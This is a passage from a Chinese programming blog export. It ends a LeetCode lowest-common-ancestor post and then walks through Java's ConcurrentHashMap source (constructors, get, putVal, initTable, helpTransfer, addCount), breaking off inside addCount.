<h2 id="提示："><a href="#提示：" class="headerlink" title="提示："></a>提示：</h2><ul>
<li>所有节点的值都是唯一的。</li>
<li>p、q 为不同节点且均存在于给定的二叉树中。</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>递归</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> TreeNode <span class="title">lowestCommonAncestor</span><span class="params">(TreeNode root, TreeNode p, TreeNode q)</span> </span>&#123;</span><br><span class="line">     	<span class="comment">//返回节点存在情况</span></span><br><span class="line">        <span class="keyword">if</span>(root == <span class="keyword">null</span> || p == root || q ==root)</span><br><span class="line">            <span class="keyword">return</span> root;</span><br><span class="line">        <span class="comment">//再左右子树寻找 p q 两个节点</span></span><br><span class="line">        TreeNode left = lowestCommonAncestor(root.left,p,q);</span><br><span class="line">        TreeNode right = lowestCommonAncestor(root.right,p,q);</span><br><span class="line">        <span class="comment">//情况1：如果右子树找不到 p 或 q 即(right==null)，</span></span><br><span class="line">        <span class="comment">//那么说明 p 和 q 都在左子树上，返回 left </span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">//情况2：如果左子树找不到 p 或 q 即(right==null)，</span></span><br><span class="line">        <span class="comment">//那么说明 p 和 q 都在右子树上，返回 right</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">//如果上述情况都不符合，说明 p 和 q 分别在左子树和右子树，</span></span><br><span class="line">        <span class="comment">//那么最近公共节点为当前节点</span></span><br><span class="line">        <span class="comment">//直接返回 root 即可</span></span><br><span class="line">        <span class="keyword">return</span> (right == <span class="keyword">null</span>) ? left : (left == <span class="keyword">null</span>) ? right : root;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>二叉树</tag>
        <tag>递归</tag>
      </tags>
  </entry>
  <entry>
    <title>ConcurrentHashMap源码解析</title>
    <url>/2020/04/17/Java/Java%E5%9F%BA%E7%A1%80/2020-04-17-ConcurrentHashMap%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/</url>
    <content><![CDATA[<h1 id="ConcurrentHashMap源码解析"><a href="#ConcurrentHashMap源码解析" class="headerlink" title="ConcurrentHashMap源码解析"></a>ConcurrentHashMap源码解析</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>ConcurrentHashMap是Java SDK提供的线程安全的HashMap类。在多线程并发的场景下，用它做添加、删除是不会出现线程安全问题的。</p>
<p>它实现了ConcurrentMap和Serializable接口。</p>
<h2 id="实现逻辑"><a href="#实现逻辑" class="headerlink" title="实现逻辑"></a>实现逻辑</h2><p>ConcurrentHashMap底层的实现是Node + 散列表+红黑树。</p>
<h2 id="主要属性"><a href="#主要属性" class="headerlink" title="主要属性"></a>主要属性</h2><ul>
<li>DEFAULT_CAPACITY：ConcurrentHashMap的默认大小是16</li>
<li>LOAD_FACTOR：负载因子。ConcurrentHashMap在超过16 * 0.75之后，就需要扩容了。</li>
<li>TREEIFY_THRESHOLD：发生哈希冲突的链表长度如果大于等于8，就会转变为红黑树</li>
<li>UNTREEIFY_THRESHOLD：发生哈希冲突的红黑树，在小于等于6个元素之后，就会回退成链表</li>
<li>MIN_TREEIFY_CAPACITY：当ConcurrentHashMap的大小大于等于64的时候，才允许将冲突的链表转为红黑树</li>
<li>Node&lt;K,V&gt;[] table 保存哈希桶的数组，大小是2的倍数</li>
<li>CounterCell[] counterCells：保存各个桶大小</li>
</ul>
<h2 id="主要函数"><a href="#主要函数" class="headerlink" title="主要函数"></a>主要函数</h2><h3 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h3><h4 id="无参构造函数"><a href="#无参构造函数" class="headerlink" title="无参构造函数"></a>无参构造函数</h4><p>创建一个空map，默认大小为16</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ConcurrentHashMap</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="有参构造函数（指定初始化大小）"><a href="#有参构造函数（指定初始化大小）" class="headerlink" title="有参构造函数（指定初始化大小）"></a>有参构造函数（指定初始化大小）</h4><p>初始化时候指定Map大小，然后会初始化为比指定大小最近的一个2的幂次数值。比如，指定大小为12的话，就初始化为16，为17的话，就初始化为32.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ConcurrentHashMap</span><span class="params">(<span class="keyword">int</span> initialCapacity)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (initialCapacity &lt; <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException();</span><br><span class="line">        <span class="keyword">int</span> cap = ((initialCapacity &gt;= (MAXIMUM_CAPACITY &gt;&gt;&gt; <span class="number">1</span>)) ?</span><br><span class="line">                   MAXIMUM_CAPACITY :</span><br><span class="line">                   tableSizeFor(initialCapacity + (initialCapacity &gt;&gt;&gt; <span class="number">1</span>) + <span class="number">1</span>));</span><br><span class="line">        <span class="keyword">this</span>.sizeCtl = cap;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="有参构造函数（指定map）"><a href="#有参构造函数（指定map）" class="headerlink" title="有参构造函数（指定map）"></a>有参构造函数（指定map）</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ConcurrentHashMap</span><span class="params">(Map&lt;? extends K, ? extends V&gt; m)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.sizeCtl = DEFAULT_CAPACITY;</span><br><span class="line">    putAll(m);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="有参构造函数（指定初始化大小和负载因子）"><a href="#有参构造函数（指定初始化大小和负载因子）" class="headerlink" title="有参构造函数（指定初始化大小和负载因子）"></a>有参构造函数（指定初始化大小和负载因子）</h4><p>调用的是下面的一个构造函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ConcurrentHashMap</span><span class="params">(<span class="keyword">int</span> initialCapacity, <span class="keyword">float</span> loadFactor)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>(initialCapacity, loadFactor, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="有参构造函数（指定初始化大小、负载因子以及并发度）"><a href="#有参构造函数（指定初始化大小、负载因子以及并发度）" class="headerlink" title="有参构造函数（指定初始化大小、负载因子以及并发度）"></a>有参构造函数（指定初始化大小、负载因子以及并发度）</h4><p>需要注意的是，map的桶个数至少是要和并发度相等的。即并发度为N，那么桶的数目就必须大于等于N</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ConcurrentHashMap</span><span class="params">(<span class="keyword">int</span> initialCapacity,</span></span></span><br><span class="line"><span class="function"><span class="params">                             <span class="keyword">float</span> loadFactor, <span class="keyword">int</span> concurrencyLevel)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!(loadFactor &gt; <span class="number">0.0f</span>) || initialCapacity &lt; <span class="number">0</span> || concurrencyLevel &lt;= <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException();</span><br><span class="line">        <span class="keyword">if</span> (initialCapacity &lt; concurrencyLevel)   <span class="comment">// Use at least as many bins</span></span><br><span class="line">            initialCapacity = concurrencyLevel;   <span class="comment">// as estimated threads</span></span><br><span class="line">        <span class="keyword">long</span> size = (<span class="keyword">long</span>)(<span class="number">1.0</span> + (<span class="keyword">long</span>)initialCapacity / loadFactor);</span><br><span class="line">        <span class="keyword">int</span> cap = (size &gt;= (<span class="keyword">long</span>)MAXIMUM_CAPACITY) ?</span><br><span class="line">            MAXIMUM_CAPACITY : tableSizeFor((<span class="keyword">int</span>)size);</span><br><span class="line">        <span class="keyword">this</span>.sizeCtl = cap;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="size"><a href="#size" class="headerlink" title="size()"></a>size()</h3><p>size方法实现很简单，就是调用sumCount方法，然后判断下是否溢出。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">size</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">long</span> n = sumCount();</span><br><span class="line">        <span class="keyword">return</span> ((n &lt; <span class="number">0L</span>) ? <span class="number">0</span> :</span><br><span class="line">                (n &gt; (<span class="keyword">long</span>)Integer.MAX_VALUE) ? Integer.MAX_VALUE :</span><br><span class="line">                (<span class="keyword">int</span>)n);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="sumCount"><a href="#sumCount" class="headerlink" title="sumCount()"></a>sumCount()</h4><p>先看下sumCount的实现</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">final</span> <span class="keyword">long</span> <span class="title">sumCount</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        CounterCell[] as = counterCells; CounterCell a;</span><br><span class="line">        <span class="keyword">long</span> sum = baseCount;</span><br><span class="line">        <span class="keyword">if</span> (as != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; as.length; ++i) &#123;</span><br><span class="line">                <span class="keyword">if</span> ((a = as[i]) != <span class="keyword">null</span>)</span><br><span class="line">                    sum += a.value;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>sumCount的逻辑也比较简单，就是使用了baseCount这个变量和CounterCell数组。</p>
<p>baseCount和CounterCell的具体使用方式，我们在put方法里面在详细说明吧。</p>
<p>先简单看下baseCount变量</p>
<h4 id="baseCount"><a href="#baseCount" class="headerlink" title="baseCount"></a>baseCount</h4><p>baseCount变量是主要用在没有竞争场景下计数使用的。通过CAS修改。</p>
<h4 id="CounterCell数组"><a href="#CounterCell数组" class="headerlink" title="CounterCell数组"></a>CounterCell数组</h4><p>在并发的场景下，如果CAS更新baseCount失败了，那么失败的线程就会创建CounterCell对象，用来保存部分总数。</p>
<h3 id="isEmpty"><a href="#isEmpty" class="headerlink" title="isEmpty()"></a>isEmpty()</h3><p>判断下sumCount的返回是否为0即可。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isEmpty</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> sumCount() &lt;= <span class="number">0L</span>; <span class="comment">// ignore transient negative values</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="get-Object"><a href="#get-Object" class="headerlink" title="get(Object)"></a>get(Object)</h3><p>先看源码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> V <span class="title">get</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">        Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; e, p; <span class="keyword">int</span> n, eh; K ek;</span><br><span class="line">        <span class="keyword">int</span> h = spread(key.hashCode());</span><br><span class="line">        <span class="keyword">if</span> ((tab = table) != <span class="keyword">null</span> &amp;&amp; (n = tab.length) &gt; <span class="number">0</span> &amp;&amp;</span><br><span class="line">            (e = tabAt(tab, (n - <span class="number">1</span>) &amp; h)) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((eh = e.hash) == h) &#123;</span><br><span class="line">                <span class="keyword">if</span> ((ek = e.key) == key || (ek != <span class="keyword">null</span> &amp;&amp; key.equals(ek)))</span><br><span class="line">                    <span class="keyword">return</span> e.val;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (eh &lt; <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> (p = e.find(h, key)) != <span class="keyword">null</span> ? p.val : <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">while</span> ((e = e.next) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (e.hash == h &amp;&amp;</span><br><span class="line">                    ((ek = e.key) == key || (ek != <span class="keyword">null</span> &amp;&amp; key.equals(ek))))</span><br><span class="line">                    <span class="keyword">return</span> e.val;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>get方法的流程如下：</p>
<ol>
<li>首先通过spread方法，计算出key的hash值</li>
<li>如果Node数组不为空，并且有值，判断头结点的key是不是和给定的Key相等</li>
<li>如果头结点的key和给定的key相等，直接返回头结点的值</li>
<li>否则，判断当前节点是树节点还是链表节点</li>
<li>树节点通过find方法寻找</li>
<li>链表节点就遍历寻找</li>
</ol>
<h4 id="spread方法"><a href="#spread方法" class="headerlink" title="spread方法"></a>spread方法</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">spread</span><span class="params">(<span class="keyword">int</span> h)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (h ^ (h &gt;&gt;&gt; <span class="number">16</span>)) &amp; HASH_BITS;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>此方法将key的哈希值的低16位和高16位做异或运算</p>
<h3 id="containsKey-Object"><a href="#containsKey-Object" class="headerlink" title="containsKey(Object)"></a>containsKey(Object)</h3><p>基于上文get方法的实现，判断get出来的值是否为null</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">containsKey</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> get(key) != <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="put-Object-Object"><a href="#put-Object-Object" class="headerlink" title="put(Object, Object)"></a>put(Object, Object)</h3><p>调用了内部方法putVal</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> V <span class="title">put</span><span class="params">(K key, V value)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> putVal(key, value, <span class="keyword">false</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="putVal方法"><a href="#putVal方法" class="headerlink" title="putVal方法"></a>putVal方法</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">final</span> V <span class="title">putVal</span><span class="params">(K key, V value, <span class="keyword">boolean</span> onlyIfAbsent)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// key 和 value都不能为空，否则空指针异常</span></span><br><span class="line">        <span class="keyword">if</span> (key == <span class="keyword">null</span> || value == <span class="keyword">null</span>) <span class="keyword">throw</span> <span class="keyword">new</span> NullPointerException();</span><br><span class="line">        <span class="comment">// 计算出key的哈希值</span></span><br><span class="line">        <span class="keyword">int</span> hash = spread(key.hashCode());</span><br><span class="line">        <span class="keyword">int</span> binCount = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (Node&lt;K,V&gt;[] tab = table;;) &#123;</span><br><span class="line">            Node&lt;K,V&gt; f; <span class="keyword">int</span> n, i, fh;</span><br><span class="line">            <span class="keyword">if</span> (tab == <span class="keyword">null</span> || (n = tab.length) == <span class="number">0</span>)</span><br><span class="line">                <span class="comment">// 如果是第一次插入数据的话，初始化table</span></span><br><span class="line">                tab = initTable();</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ((f = tabAt(tab, i = (n - <span class="number">1</span>) &amp; hash)) == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="comment">// 如果当前table位置上没有元素，说明是第一个，CAS新建一个Node</span></span><br><span class="line">                <span class="keyword">if</span> (casTabAt(tab, i, <span class="keyword">null</span>,</span><br><span class="line">                             <span class="keyword">new</span> Node&lt;K,V&gt;(hash, key, value, <span class="keyword">null</span>)))</span><br><span class="line">                    <span class="comment">// CAS 新建Node成功，返回</span></span><br><span class="line">                    <span class="keyword">break</span>;                   <span class="comment">// no lock when adding to empty bin</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ((fh = f.hash) == MOVED)</span><br><span class="line">                <span class="comment">// 如果当前桶的hash值是-1，说明当前map正在扩容，进入协助扩容</span></span><br><span class="line">                tab = helpTransfer(tab, f);</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 否则插入链表或者是树中</span></span><br><span class="line">                V oldVal = <span class="keyword">null</span>;</span><br><span class="line">                <span class="keyword">synchronized</span> (f) &#123;</span><br><span class="line">                    <span class="comment">// 锁住头结点</span></span><br><span class="line">                    <span class="keyword">if</span> (tabAt(tab, i) == f) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (fh &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                            binCount = <span class="number">1</span>;</span><br><span class="line">                            <span class="keyword">for</span> (Node&lt;K,V&gt; e = f;; ++binCount) &#123;</span><br><span class="line">                                K ek;</span><br><span class="line">                                <span class="keyword">if</span> (e.hash == hash &amp;&amp;</span><br><span class="line">                                    ((ek = e.key) == key ||</span><br><span class="line">                                     (ek != <span class="keyword">null</span> &amp;&amp; key.equals(ek)))) &#123;</span><br><span class="line">                                    <span class="comment">// 如果Key相等，更新value</span></span><br><span class="line">                                    oldVal = e.val;</span><br><span class="line">                                    <span class="keyword">if</span> (!onlyIfAbsent)</span><br><span class="line">                                        e.val = value;</span><br><span class="line">                                    <span class="keyword">break</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                                Node&lt;K,V&gt; pred = e;</span><br><span class="line">                                <span class="keyword">if</span> ((e = e.next) == <span class="keyword">null</span>) &#123;</span><br><span class="line">                                    <span class="comment">// 新节点插入链表</span></span><br><span class="line">                                    pred.next = <span class="keyword">new</span> Node&lt;K,V&gt;(hash, key,</span><br><span class="line">                                                              value, <span class="keyword">null</span>);</span><br><span class="line">                                    <span class="keyword">break</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span> (f <span class="keyword">instanceof</span> TreeBin) &#123;</span><br><span class="line">                            <span class="comment">// 插入红黑树</span></span><br><span class="line">                            Node&lt;K,V&gt; p;</span><br><span class="line">                            binCount = <span class="number">2</span>;</span><br><span class="line">                            <span class="keyword">if</span> ((p = ((TreeBin&lt;K,V&gt;)f).putTreeVal(hash, key,</span><br><span class="line">                                                           value)) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                                oldVal = p.val;</span><br><span class="line">                                <span class="keyword">if</span> (!onlyIfAbsent)</span><br><span class="line">                                    p.val = value;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (binCount != <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="comment">// 如果当前链表的长度超过了阈值，转换为红黑树</span></span><br><span class="line">                    <span class="keyword">if</span> (binCount &gt;= TREEIFY_THRESHOLD)</span><br><span class="line">                        treeifyBin(tab, i);</span><br><span class="line">                    <span class="keyword">if</span> (oldVal != <span class="keyword">null</span>)</span><br><span class="line">                        <span class="keyword">return</span> oldVal;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 当前map的大小加一，并判断是否需要扩容</span></span><br><span class="line">        addCount(<span class="number">1L</span>, binCount);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>总的来说，put方法的步骤是：</p>
<ol>
<li>判断table是否为空，是的话，就先初始化table</li>
<li>如果对应位置的桶是空的，就新建一个Node节点CAS插入</li>
<li>如果要插入的桶的Hash值为Moved，也就是-1，说明其他线程正在扩容，进入协助扩容方法</li>
<li>插入链表或者是树</li>
<li>如果完成之后，如果链表个数超过阈值，转换为树</li>
<li>map的大小加1</li>
</ol>
<h4 id="initTable方法"><a href="#initTable方法" class="headerlink" title="initTable方法"></a>initTable方法</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Node&lt;K,V&gt;[] initTable() &#123;</span><br><span class="line">        Node&lt;K,V&gt;[] tab; <span class="keyword">int</span> sc;</span><br><span class="line">        <span class="keyword">while</span> ((tab = table) == <span class="keyword">null</span> || tab.length == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((sc = sizeCtl) &lt; <span class="number">0</span>)</span><br><span class="line">                Thread.yield(); <span class="comment">// lost initialization race; just spin</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (U.compareAndSwapInt(<span class="keyword">this</span>, SIZECTL, sc, -<span class="number">1</span>)) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> ((tab = table) == <span class="keyword">null</span> || tab.length == <span class="number">0</span>) &#123;</span><br><span class="line">                        <span class="keyword">int</span> n = (sc &gt; <span class="number">0</span>) ? sc : DEFAULT_CAPACITY;</span><br><span class="line">                        <span class="meta">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)</span><br><span class="line">                        Node&lt;K,V&gt;[] nt = (Node&lt;K,V&gt;[])<span class="keyword">new</span> Node&lt;?,?&gt;[n];</span><br><span class="line">                        table = tab = nt;</span><br><span class="line">                        sc = n - (n &gt;&gt;&gt; <span class="number">2</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    sizeCtl = sc;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> tab;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>initTable在执行的时候，发现有其他线程也在做初始化动作的话，它会调用Thread.yield方法，释放cpu，让其他线程继续做初始化动作。</p>
<h4 id="helpTransfer方法"><a href="#helpTransfer方法" class="headerlink" title="helpTransfer方法"></a>helpTransfer方法</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> Node&lt;K,V&gt;[] helpTransfer(Node&lt;K,V&gt;[] tab, Node&lt;K,V&gt; f) &#123;</span><br><span class="line">        Node&lt;K,V&gt;[] nextTab; <span class="keyword">int</span> sc;</span><br><span class="line">        <span class="keyword">if</span> (tab != <span class="keyword">null</span> &amp;&amp; (f <span class="keyword">instanceof</span> ForwardingNode) &amp;&amp;</span><br><span class="line">            (nextTab = ((ForwardingNode&lt;K,V&gt;)f).nextTable) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">//返回一个 16 位长度的扩容校验标识</span></span><br><span class="line">            <span class="keyword">int</span> rs = resizeStamp(tab.length);</span><br><span class="line">            <span class="keyword">while</span> (nextTab == nextTable &amp;&amp; table == tab &amp;&amp;</span><br><span class="line">                   (sc = sizeCtl) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">//sizeCtl 如果处于扩容状态的话</span></span><br><span class="line">                <span class="comment">//前 16 位是数据校验标识，后 16 位是当前正在扩容的线程总数</span></span><br><span class="line">                <span class="comment">//这里判断校验标识是否相等，如果校验符不等或者扩容操作已经完成了，直接退出循环，不用协助它们扩容了</span></span><br><span class="line">                <span class="keyword">if</span> ((sc &gt;&gt;&gt; RESIZE_STAMP_SHIFT) != rs || sc == rs + <span class="number">1</span> ||</span><br><span class="line">                    sc == rs + MAX_RESIZERS || transferIndex &lt;= <span class="number">0</span>)</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="comment">//否则调用 transfer 帮助它们进行扩容</span></span><br><span class="line">			    <span class="comment">//sc + 1 标识增加了一个线程进行扩容</span></span><br><span class="line">                <span class="keyword">if</span> (U.compareAndSwapInt(<span class="keyword">this</span>, SIZECTL, sc, sc + <span class="number">1</span>)) &#123;</span><br><span class="line">                    transfer(tab, nextTab);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> nextTab;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> table;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="addCount方法"><a href="#addCount方法" class="headerlink" title="addCount方法"></a>addCount方法</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">addCount</span><span class="params">(<span class="keyword">long</span> x, <span class="keyword">int</span> check)</span> </span>&#123;</span><br><span class="line">        CounterCell[] as; <span class="keyword">long</span> b, s;</span><br><span class="line">        <span class="comment">// 如果as不为null（存在并发），或者CAS更新baseCount失败</span></span><br><span class="line">        <span class="keyword">if</span> ((as = counterCells) != <span class="keyword">null</span> ||</span><br><span class="line">            !U.compareAndSwapLong(<span class="keyword">this</span>, BASECOUNT, b = baseCount, s = b + x)) &#123;</span><br><span class="line">            <span class="comment">// 通过as来计数</span></span><br><span class="line">            CounterCell a; <span class="keyword">long</span> v; <span class="keyword">int</span> m;</span><br><span class="line">            <span class="keyword">boolean</span> uncontended = <span class="keyword">true</span>;</span><br><span class="line">            <span class="comment">// 如果 as 是空（还不是并发）或者 (ss 中随机取余一个数组位置为空 或者 ss 这个位置的变量失败）</span></span><br><span class="line">            <span class="comment">// 说明通过as计数失败，调用fullAddCount</span></span><br><span class="line">            <span class="keyword">if</span> (as == <span class="keyword">null</span> || (m = as.length - <span class="number">1</span>) &lt; <span class="number">0</span> ||</span><br><span class="line">                (a = as[ThreadLocalRandom.getProbe() &amp; m]) == <span class="keyword">null</span> ||</span><br><span class="line">                !(uncontended =</span><br><span class="line">                  U.compareAndSwapLong(a, CELLVALUE, v = a.value, v + x))) &#123;</span><br><span class="line">                fullAddCount(x, uncontended);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (check &lt;= <span class="number">1</span>)</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            <span class="comment">// 统计当前的总大小</span></span><br><span class="line">            s = sumCount();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (check &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            Node&lt;K,V&gt;[] tab, nt; <span class="keyword">int</span> n, sc;</span><br><span class="line">            <span class="comment">// 检查扩容条件：</span></span><br><span class="line">        <span class="comment">// 1. 是否达到阀值: s &gt;= sizeCtl </span></span><br><span class="line">        <span class="comment">// 2. 是否可以扩容: tab != null &amp;&amp; tab 当前的长度小于 1 &lt;&lt; 30</span></span><br><span class="line">        <span class="keyword">while</span> (s &gt;= (<span class="keyword">long</span>)(sc = sizeCtl) &amp;&amp; (tab = table) != <span class="keyword">null</span> &amp;&amp;</span><br><span class="line">                   (n = tab.length) &lt; MAXIMUM_CAPACITY) &#123;</span><br><span class="line">                <span class="comment">// 根据当前桶的数量生成一个标志位</span></span><br><span class="line">                <span class="keyword">int</span> rs = resizeStamp(n);</span><br><span class="line">                <span class="comment">// 如果正在扩容</span></span><br><span class="line">                <span class="keyword">if</span> (sc &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="comment">// 检查当前扩容的进展:</span></span><br><span class="line">                <span class="comment">// 1. 如果 sc 的低 16 位不等于标识位（ sizeCtl 变化了，说明容器状态已经变化），退出</span></span><br><span class="line">                <span class="comment">// 2. 如果 sc == 标识位 + 1 （通过下面代码可知，刚开始扩容时， sc = rs + 2，如果 sc = rs + 1，说明已经没有线程在扩容），退出</span></span><br><span class="line">                <span class="comment">// 3. 如果 sc == 标识符 + 65535，参与扩容的线程已经达到最大数量，当前线程不再参与，退出</span></span><br><span class="line">                <span class="comment">// 4. 如果 nextTable == null 说明扩容结束（nextTable 在扩容中起中转作用，所有的元素会被限移到 nextTable 中，最后让 tab = nextTable，nextTable == null 来完成扩容），退出</span></span><br><span class="line">                <span class="comment">// 5. transferIndex &lt;= 0 说明没有桶还需要迁移了（transferIndex 用于标识当前迁移到哪个桶了，小于等于 0 说明已经迁移到最后一个桶或者已经迁移完成，迁移的顺序是从最后一个桶开始），退出。</span></span><br><span class="line">                <span class="keyword">if</span> ((sc &gt;&gt;&gt; RESIZE_STAMP_SHIFT) != rs || sc == rs + <span class="number">1</span> ||</span><br><span class="line">                        sc == rs + MAX_RESIZERS || (nt = nextTable) == <span class="keyword">null</span> ||</span><br><span class="line">                        transferIndex &lt;= <span class="number">0</span>)</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="comment">// 如果迁移还是进行，当前线程尝试参与扩容</span></span><br><span class="line">                    <span class="keyword">if</span> (U.compareAndSwapInt(<span 